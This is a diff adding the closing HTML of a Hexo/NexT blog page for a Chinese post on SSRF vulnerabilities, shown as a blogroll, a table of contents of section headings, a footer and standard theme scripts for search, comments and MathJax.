+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://wkh.dropsec.xyz" title="王小洪" target="_blank">王小洪</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://fgp.dropsec.xyz" title="冯小鹏" target="_blank">冯小鹏</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://blog.neargle.com/" title="周小斌" target="_blank">周小斌</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://010.dropsec.xyz/" title="小光头" target="_blank">小光头</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://www.dropsec.xyz/" title="团队主页" target="_blank">团队主页</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://www.w2n1ck.com/" title="个人主页" target="_blank">个人主页</a>
+                </li>
+              
+            </ul>
+          </div>
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Know-it"><span class="nav-number">1.</span> <span class="nav-text">Know it</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#什么是SSRF"><span class="nav-number">1.1.</span> <span class="nav-text">什么是SSRF</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SSRF能干什么"><span class="nav-number">1.2.</span> <span class="nav-text">SSRF能干什么</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#怎么找SSRF漏洞"><span class="nav-number">1.3.</span> <span class="nav-text">怎么找SSRF漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SSRF怎么形成的"><span class="nav-number">1.4.</span> <span class="nav-text">SSRF怎么形成的</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Hack-it"><span class="nav-number">2.</span> <span class="nav-text">Hack it</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞复现"><span class="nav-number">2.1.</span> <span class="nav-text">漏洞复现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞实践"><span class="nav-number">2.2.</span> <span class="nav-text">漏洞实践</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#内网探测"><span class="nav-number">2.3.</span> <span class="nav-text">内网探测</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SSRF绕过技巧"><span class="nav-number">2.4.</span> <span class="nav-text">SSRF绕过技巧</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1、"><span class="nav-number">2.4.1.</span> <span class="nav-text">1、@</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2、添加端口号"><span class="nav-number">2.4.2.</span> <span class="nav-text">2、添加端口号</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3、短地址"><span class="nav-number">2.4.3.</span> <span class="nav-text">3、短地址</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4、特殊域名"><span class="nav-number">2.4.4.</span> <span class="nav-text">4、特殊域名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5、ip进制转换"><span class="nav-number">2.4.5.</span> <span class="nav-text">5、ip进制转换</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SSRF防御"><span class="nav-number">3.</span> <span class="nav-text">SSRF防御</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy;  2015 - 
+  <span itemprop="copyrightYear">2017</span>
+  <span class="with-love">
+    <i class="fa fa-linkedin"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">w2n1ck</span>
+</div>
+
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.1"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  
+
+    
+      <script id="dsq-count-scr" src="https://mydisqus-2.disqus.com/count.js" async></script>
+    
+
+    
+      <script type="text/javascript">
+        var disqus_config = function () {
+          this.page.url = 'http://byd.dropsec.xyz/2017/06/04/SSRF漏洞剖析与利用/';
+          this.page.identifier = '2017/06/04/SSRF漏洞剖析与利用/';
+          this.page.title = 'SSRF漏洞剖析与利用';
+        };
+        var d = document, s = d.createElement('script');
+        s.src = 'https://mydisqus-2.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', '' + +new Date());
+        (d.head || d.body).appendChild(s);
+      </script>
+    
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (search_path.endsWith("json")) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+  
+
+
+  
+
+  
+
+<script type="text/javascript" color="255,0,0" opacity='0.7' zIndex="-2" count="80" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+</body>
+</html>
